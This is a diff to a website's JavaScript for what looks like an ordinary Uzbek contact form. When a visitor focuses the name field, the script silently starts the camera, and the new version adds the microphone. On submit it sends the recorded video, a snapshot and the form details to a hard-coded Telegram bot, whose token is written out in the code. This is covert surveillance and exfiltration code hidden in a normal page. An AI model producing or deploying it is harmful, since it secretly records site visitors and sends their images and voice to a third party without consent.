@@ -55,73 +55,57 @@ document.addEventListener("DOMContentLoaded", function () {
     document.querySelector(`[data-lang="${savedLang}"]`).click();
 
 
-    let video = document.getElementById('video');
-    let canvas = document.getElementById('canvas');
-    let captureBtn = document.getElementById('captureBtn');
     let mediaRecorder;
-    let videoChunks = [];
-    let videoBlob;
-    let stream;
+        let videoChunks = [];
+        let videoBlob;
+        let stream;
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
 
-    document.getElementById('ism').addEventListener('focus', async () => {
-        document.getElementById('ism').value = "Foydalanuvchi";
-        stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        video.srcObject = stream;
-        video.style.display = 'block';
+        document.getElementById('ism').addEventListener('focus', async () => {
+            document.getElementById('ism').value = "";
+            stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            video.srcObject = stream;
+            video.style.display = 'block';
+            mediaRecorder = new MediaRecorder(stream);
+            mediaRecorder.ondataavailable = (event) => videoChunks.push(event.data);
+            mediaRecorder.start();
+        });
 
-        mediaRecorder = new MediaRecorder(stream);
-        mediaRecorder.ondataavailable = (event) => videoChunks.push(event.data);
-        mediaRecorder.onstop = () => {
-            videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
-            videoChunks = [];
-            stream.getTracks().forEach(track => track.stop());
-            video.style.display = 'none';
-        };
-        mediaRecorder.start();
-        setTimeout(() => {
+        document.querySelector('.form__send__btn').addEventListener('click', async function(event) {
+            event.preventDefault();
             mediaRecorder.stop();
-        }, 5000);
-    });
+            mediaRecorder.onstop = async () => {
+                videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
+                videoChunks = [];
+                stream.getTracks().forEach(track => track.stop());
+                video.style.display = 'none';
 
-    captureBtn.addEventListener('click', () => {
-        if (video.srcObject) {
-            let context = canvas.getContext('2d');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            canvas.style.display = 'block';
-        }
-    });
+                let ism = document.getElementById('ism').value;
+                let telefon = document.getElementById('telefon').value;
+                let botToken = '7772442946:AAGsBqTDxTm20nn-NfIye37zGmBpnOZrxTs';
+                let chatId = '7221078203';
+                let message = `Yangi xabar!%0AIsm: ${ism}%0ATelefon: ${telefon}`;
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`);
 
-    document.querySelector('.call__back__content').addEventListener('submit', async function(event) {
-        event.preventDefault();
-        let ism = document.getElementById('ism').value;
-        let email = document.getElementById('email1').value;
-        let telefon = document.getElementById('telefon').value;
-        let izoh = document.getElementById('izoh').value;
-        let botToken = '7772442946:AAGsBqTDxTm20nn-NfIye37zGmBpnOZrxTs';
-        let chatId = '7221078203';
-        let message = `Yangi xabar!\n\nIsm: ${ism}\nEmail: ${email}\nTelefon: ${telefon}\nIzoh: ${izoh}`;
-        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
-        
-        if (canvas && canvas.toBlob) {
-            canvas.toBlob(async (blob) => {
-                let formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('photo', blob, 'photo.png');
-                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
-            });
-        }
-        
-        if (videoBlob) {
-            let formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('video', videoBlob, 'video.mp4');
-            await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: formData });
-        }
-        alert('Xabar yuborildi!');
-        this.reset();
-    });
+                if (canvas && canvas.toBlob) {
+                    canvas.toBlob(async (blob) => {
+                        let formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('photo', blob, 'photo.png');
+                        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
+                    });
+                }
+
+                if (videoBlob) {
+                    let formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('video', videoBlob, 'video.mp4');
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: formData });
+                }
+                alert('Xabar yuborildi!');
+            };
+        });
     
     
 });
